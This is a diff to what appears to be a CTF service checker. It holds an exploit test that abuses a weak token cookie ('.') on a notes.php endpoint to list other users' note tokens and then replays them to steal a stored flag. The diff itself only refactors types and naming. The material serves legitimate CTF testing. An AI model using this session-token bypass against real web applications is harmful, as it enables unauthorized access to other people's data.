@@ -261,11 +261,8 @@ async def putflag_test_1(
     logger: LoggerAdapter,
     client: AsyncClient,
     db: ChainDB,
-) -> str:
-    r = await client.post("/notes.php", data={
-        "name": "flag",
-        "content": task.flag
-    })
+) -> None:
+    r = await client.post("/notes.php", data={"name": "flag", "content": task.flag})
     token = r.cookies["token"]
     await db.set("token", token)
 
@@ -292,14 +289,15 @@ async def exploit_test_1(
     logger: LoggerAdapter,
     searcher: FlagSearcher,
     client: AsyncClient,
-) -> Optional[str]:
+) -> Optional[bytes]:
     r = await client.get(f"/notes.php", cookies={"token": "."})
     matches = re.findall(r"<a href='notes.php\?show=([a-z0-9]+)'>", r.text)
-    matches = reversed(sorted(matches))
-    for t in matches:
+    r_matches = reversed(sorted(matches))
+    for t in r_matches:
         r = await client.get("/notes.php?show=flag", cookies={"token": t})
         if flag := searcher.search_flag(r.text):
             return flag
+    return None
 
 
 l = 20
